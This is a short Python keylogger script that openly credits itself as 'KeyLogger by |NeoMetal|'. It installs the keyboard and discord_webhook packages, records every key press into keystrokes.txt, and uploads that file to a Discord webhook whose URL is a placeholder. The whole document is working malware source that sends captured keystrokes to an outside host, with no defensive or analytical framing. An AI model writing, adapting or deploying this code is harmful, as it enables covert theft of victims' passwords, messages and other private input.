import os

#depencies install
os.system(f"pip install keyboard discord_webhook")

import keyboard
from discord_webhook import DiscordWebhook

webhook = DiscordWebhook(url='#discord_webhook_url', username="#bot_name")

check_file = os.path.isfile('keystrokes.txt')

for i in range(1):
    if check_file == True:
        continue
    else:
        with open("keystrokes.txt", "w") as file:
            file.write("KeyLogger by |NeoMetal|")

log_file = 'keystrokes.txt'

#ds_send part
with open("./keystrokes.txt", 'rb') as message:
    webhook.add_file(file = message.read(), filename="keystrokes.txt")
response = webhook.execute()


#keylog part
def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))

keyboard.on_press(on_key_press)

keyboard.wait()

